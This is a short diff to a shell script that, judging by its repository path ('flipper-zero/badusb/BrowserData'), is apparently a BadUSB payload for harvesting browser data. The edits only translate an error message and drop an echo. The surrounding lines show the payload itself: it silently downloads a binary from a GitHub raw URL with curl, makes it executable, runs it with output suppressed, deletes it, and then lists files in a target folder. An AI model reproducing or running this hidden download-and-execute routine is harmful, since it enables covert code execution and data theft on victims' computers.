@@ -22,7 +22,7 @@ case "$architecture" in
         file_url="https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_386"
         ;;
     *)
-        echo "Architecture non supportée : $architecture"
+        echo "Unsupported : $architecture"
         exit 1
         ;;
 esac
@@ -30,7 +30,6 @@ esac
 curl -sSL $file_url -o magikarp.sh > /dev/null
 
 chmod +x magikarp.sh > /dev/null
-echo "Exécution du script" > /dev/null
 ./magikarp.sh > /dev/null
 rm "magikarp.sh" > /dev/null
 files=($(find "$folder_path" -type f))
